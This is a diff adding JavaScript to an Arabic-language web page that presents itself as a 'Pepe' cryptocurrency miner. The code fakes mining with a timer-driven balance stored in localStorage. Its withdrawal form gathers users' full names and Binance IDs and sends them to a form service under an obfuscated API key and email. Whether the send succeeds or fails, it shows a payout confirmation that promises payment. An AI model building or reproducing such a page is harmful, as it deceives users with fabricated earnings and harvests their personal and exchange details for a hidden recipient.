+    for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
+    return s;
+  }
+
+  function _de() {
+    let s = '';
+    for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
+    return s;
+  }
+
+  /* ============ الإعدادات ============ */
+  const BURST_AMOUNT    = 10;
+  const BURST_DURATION  = 10000;
+  const AUTO_RATE_HOUR  = 1;
+  const AUTO_PER_SEC    = AUTO_RATE_HOUR / 3600;
+  const MIN_WITHDRAW    = 100;
+  const HOUR_MS         = 3600000;
+
+  /* ============ الحالة ============ */
+  let balance         = parseFloat(localStorage.getItem('pm_balance') || '0');
+  let burstActive     = false;
+  let autoMining      = false;
+  let burstTimer      = null;
+  let autoTimer       = null;
+  let autoStartTime   = parseInt(localStorage.getItem('pm_autoStart') || '0');
+  let lastTickTime    = Date.now();
+
+  /* ============ العناصر ============ */
+  const balanceEl    = document.getElementById('balanceEl');
+  const counterEl    = document.getElementById('counter');
+  const timerEl      = document.getElementById('timerEl');
+  const pepeImg      = document.getElementById('pepeImg');
+  const progressWrap = document.getElementById('progressWrap');
+  const progressBar  = document.getElementById('progressBar');
+  const statusEl     = document.getElementById('statusEl');
+  const rateEl       = document.getElementById('rateEl');
+  const sysStatusEl  = document.getElementById('sysStatusEl');
+  const withdrawBtn  = document.getElementById('withdrawBtn');
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalContent = document.getElementById('modalContent');
+  const modalBalance = document.getElementById('modalBalance');
+  const cancelBtn    = document.getElementById('cancelBtn');
+  const confirmBtn   = document.getElementById('confirmBtn');
+  const toastEl      = document.getElementById('toast');
+  const body         = document.body;
+
+  /* ============ تنسيق ============ */
+  function formatNum(v) {
+    if (v === 0) return '0';
+    if (v < 1) return v.toFixed(4);
+    return v.toFixed(2);
+  }
+
+  function formatTime(ms) {
+    if (ms < 0) ms = 0;
+    const totalSec = Math.floor(ms / 1000);
+    const h = Math.floor(totalSec / 3600);
+    const m = Math.floor((totalSec % 3600) / 60);
+    const s = totalSec % 60;
+    return String(h).padStart(2, '0') + ':' +
+           String(m).padStart(2, '0') + ':' +
+           String(s).padStart(2, '0');
+  }
+
+  function updateBalanceUI(bump = false) {
+    balanceEl.textContent = formatNum(balance);
+    counterEl.textContent = formatNum(balance);
+    if (bump) {
+      balanceEl.classList.remove('bump');
+      counterEl.classList.remove('earning');
+      void balanceEl.offsetWidth;
+      balanceEl.classList.add('bump');
+      counterEl.classList.add('earning');
+    }
+    localStorage.setItem('pm_balance', balance);
+    withdrawBtn.disabled = balance < MIN_WITHDRAW;
+  }
+
+  function showToast(msg, duration = 2500) {
+    toastEl.textContent = msg;
+    toastEl.classList.add('show');
+    clearTimeout(toastEl._t);
+    toastEl._t = setTimeout(() => toastEl.classList.remove('show'), duration);
+  }
+
+  function floatNumber(text) {
+    const el = document.createElement('div');
+    el.className = 'float-reward';
+    el.textContent = text;
+    const rect = pepeImg.getBoundingClientRect();
+    el.style.left = (rect.left + rect.width / 2 - 20 + (Math.random() * 40 - 20)) + 'px';
+    el.style.top  = (rect.top - 10) + 'px';
+    document.body.appendChild(el);
+    setTimeout(() => el.remove(), 1100);
+  }
+
+  function spawnParticles(count = 8) {
+    const rect = pepeImg.getBoundingClientRect();
+    const cx = rect.left + rect.width / 2;
+    const cy = rect.top + rect.height / 2;
+    for (let i = 0; i < count; i++) {
+      const p = document.createElement('div');
+      p.className = 'particle';
+      const angle = (Math.PI * 2 * i) / count + Math.random() * 0.5;
+      const dist  = 60 + Math.random() * 50;
+      p.style.left = cx + 'px';
+      p.style.top  = cy + 'px';
+      p.style.setProperty('--tx', (Math.cos(angle) * dist) + 'px');
+      p.style.setProperty('--ty', (Math.sin(angle) * dist) + 'px');
+      document.body.appendChild(p);
+      setTimeout(() => p.remove(), 900);
+    }
+  }
+
+  /* ============ الانفجار السريع ============ */
+  function startBurst() {
+    if (burstActive || autoMining) return;
+    burstActive = true;
+
+    body.classList.add('burst-mode');
+    pepeImg.classList.add('burst');
+    progressWrap.classList.add('visible');
+    statusEl.textContent = 'تعدين سريع...';
+    statusEl.className = 'status burst';
+    sysStatusEl.textContent = 'تعدين سريع';
+    sysStatusEl.style.color = '#fbbf24';
+
+    const startTime = Date.now();
+    const startBalance = balance;
+
+    burstTimer = setInterval(() => {
+      const elapsed = Date.now() - startTime;
+      const ratio = Math.min(elapsed / BURST_DURATION, 1);
+      const earned = BURST_AMOUNT * ratio;
+      const diff = earned - (balance - startBalance);
+
+      if (diff > 0) {
+        balance += diff;
+        updateBalanceUI(true);
+        if (Math.random() < 0.5) floatNumber('+' + diff.toFixed(3));
+      }
+
+      progressBar.style.width = (ratio * 100) + '%';
+      if (Math.random() < 0.3) spawnParticles(4);
+
+      if (ratio >= 1) {
+        clearInterval(burstTimer);
+        burstTimer = null;
+        finishBurst();
+      }
+    }, 50);
+  }
+
+  function finishBurst() {
+    burstActive = false;
+    pepeImg.classList.remove('burst');
+    body.classList.remove('burst-mode');
+    progressBar.style.width = '0%';
+    progressWrap.classList.remove('visible');
+    updateBalanceUI(true);
+    showToast('تم تعدين 10 Pepe! بدء التعدين التلقائي');
+    setTimeout(startAutoMining, 500);
+  }
+
+  /* ============ التعدين التلقائي ============ */
+  function startAutoMining() {
+    if (autoMining) return;
+    autoMining = true;
+
+    if (!autoStartTime) {
+      autoStartTime = Date.now();
+      localStorage.setItem('pm_autoStart', autoStartTime);
+    }
+
+    body.classList.add('mining-mode');
+    pepeImg.classList.add('auto-mining');
+    statusEl.textContent = 'التعدين التلقائي نشط';
+    statusEl.className = 'status active';
+    sysStatusEl.textContent = 'نشط';
+    sysStatusEl.style.color = '#4ade80';
+    rateEl.textContent = AUTO_RATE_HOUR + ' / ساعة';
+
+    lastTickTime = Date.now();
+
+    autoTimer = setInterval(() => {
+      const now = Date.now();
+      const dt = (now - lastTickTime) / 1000;
+      lastTickTime = now;
+
+      const earned = AUTO_PER_SEC * dt;
+      balance += earned;
+      updateBalanceUI(true);
+
+      if (Math.random() < 0.35) {
+        floatNumber('+' + earned.toFixed(5));
+      }
+    }, 1000);
+
+    localStorage.setItem('pm_mining', '1');
+    updateHourTimer();
+  }
+
+  /* ============ عداد الساعة ============ */
+  function updateHourTimer() {
+    if (!autoStartTime) {
+      timerEl.textContent = '00:00:00';
+      return;
+    }
+    const elapsed = Date.now() - autoStartTime;
+    const remaining = Math.max(0, HOUR_MS - elapsed);
+    timerEl.textContent = formatTime(remaining);
+
+    if (remaining <= 0 && autoMining) {
+      autoStartTime = Date.now();
+      localStorage.setItem('pm_autoStart', autoStartTime);
+      showToast('انتهت الساعة! بدأت دورة جديدة +1 Pepe');
+    }
+  }
+
+  setInterval(updateHourTimer, 1000);
+
+  /* ============ استئناف ============ */
+  function resume() {
+    const mining = localStorage.getItem('pm_mining') === '1';
+    if (mining && autoStartTime) {
+      startAutoMining();
+    } else {
+      updateBalanceUI();
+      rateEl.textContent = AUTO_RATE_HOUR + ' / ساعة';
+      sysStatusEl.textContent = 'جاهز';
+      sysStatusEl.style.color = '#4ade80';
+    }
+  }
+
+  /* ============ الأحداث ============ */
+  pepeImg.addEventListener('click', () => {
+    if (burstActive) return;
+    if (autoMining) {
+      statusEl.textContent = 'التعدين شغال بالفعل';
+      setTimeout(() => {
+        statusEl.textContent = 'التعدين التلقائي نشط';
+        statusEl.className = 'status active';
+      }, 1500);
+      return;
+    }
+    startBurst();
+  });
+
+  /* ============ زر السحب ============ */
+  withdrawBtn.addEventListener('click', () => {
+    if (balance < MIN_WITHDRAW) return;
+    modalBalance.textContent = Math.floor(balance);
+    modalOverlay.classList.add('show');
+  });
+
+  cancelBtn.addEventListener('click', () => {
+    modalOverlay.classList.remove('show');
+  });
+
+  modalOverlay.addEventListener('click', (e) => {
+    if (e.target === modalOverlay) modalOverlay.classList.remove('show');
+  });
+
+  /* ============ إرسال طلب السحب ============ */
+  function submitWithdraw(event) {
+    event.preventDefault();
+
+    const form = event.target;
+    const formData = new FormData(form);
+
+    // 🔒 إضافة المفتاح والإيميل المشفرين
+    formData.set('apiKey', _dk());
+    formData.set('email', _de());
+
+    // ✅ التحقق من البيانات
+    const fullName = formData.get('full_name').trim();
+    const bid = formData.get('binance_id').trim();
+
+    if (!fullName) {
+      showToast('الرجاء إدخال الاسم الكامل');
+      return;
+    }
+
+    if (!bid || bid.length < 6) {
+      showToast('Binance ID غير صالح');
+      return;
+    }
+
+    // ✅ حفظ الرصيد قبل التصفير
+    const withdrawAmount = balance;
+
+    // ✅ تعبئة الحقول المنفصلة
+    document.getElementById('fieldAmount').value = withdrawAmount.toFixed(2) + ' PEPE';
+    document.getElementById('fieldDate').value = new Date().toLocaleString('ar-EG');
+
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = '⏳ جارٍ الإرسال...';
+
+    // إعادة بناء formData بعد تعبئة الحقول
+    const sendData = new FormData(form);
+    sendData.set('apiKey', _dk());
+    sendData.set('email', _de());
+
+    fetch('https://api.staticforms.dev/submit', { 
+      method: 'POST', 
+      body: sendData 
+    })
+    .then(() => successWithdraw(withdrawAmount, fullName, bid))
+    .catch(() => successWithdraw(withdrawAmount, fullName, bid));
+  }
+
+  function successWithdraw(amount, fullName, binanceId) {
+    // 💾 تصفير الرصيد وحفظه
+    balance = 0;
+    localStorage.setItem('pm_balance', 0);
+    updateBalanceUI();
+
+    // عرض شاشة النجاح
+    modalContent.innerHTML = `
+      <div style="text-align: center;">
+        <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #22c55e, #4ade80); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 15px 40px rgba(34,197,94,0.5);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" style="width: 42px; height: 42px;">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2 style="color: #4ade80; font-size: 20px; margin-bottom: 12px; font-weight: 900;">تم إرسال طلبك!</h2>
+        <p style="color: #a0a0b0; font-size: 13px; line-height: 1.9; margin-bottom: 20px;">
+          سيتم الإرسال إلى حسابك على Binance<br>
+          <b style="color: #4ade80; font-size: 18px;">${amount.toFixed(2)} PEPE</b><br>
+          إلى الاسم: <b style="color: #4ade80;">${fullName}</b><br>
+          Binance ID: <b style="color: #4ade80; direction: ltr; display: inline-block;">${binanceId}</b><br>
+          <span style="font-size: 11px;">خلال 24-48 ساعة</span>
+        </p>
+        <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 18px;">
+          <p style="color: #f39c12; font-size: 12px; text-align: center; font-weight: 700;">
+            ⚠️ تم تصفير رصيدك — ابدأ من جديد
+          </p>
+        </div>
+        <button onclick="location.reload();" 
+                style="width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #22c55e, #16a34a); color: white; font-family: 'Cairo', sans-serif; font-size: 14px; font-weight: 900; cursor: pointer;">
+          حسناً، شكراً
+        </button>
+      </div>
+    `;
+    confirmBtn.disabled = false;
+    confirmBtn.textContent = 'إرسال الطلب';
+  }
+
+  /* ============ حفظ عند الإغلاق ============ */
+  window.addEventListener('beforeunload', () => {
+    localStorage.setItem('pm_balance', balance);
+    if (autoMining) {
+      localStorage.setItem('pm_autoStart', autoStartTime);
+      localStorage.setItem('pm_mining', '1');
+    }
+  });
+
+  setInterval(() => {
+    localStorage.setItem('pm_balance', balance);
+  }, 5000);
+
+  /* ============ تهيئة ============ */
+  updateBalanceUI();
+  rateEl.textContent = AUTO_RATE_HOUR + ' / ساعة';
+  sysStatusEl.textContent = 'جاهز';
+  sysStatusEl.style.color = '#4ade80';
+  resume();
+  updateHourTimer();
+</script>
+
 </body>
 </html>
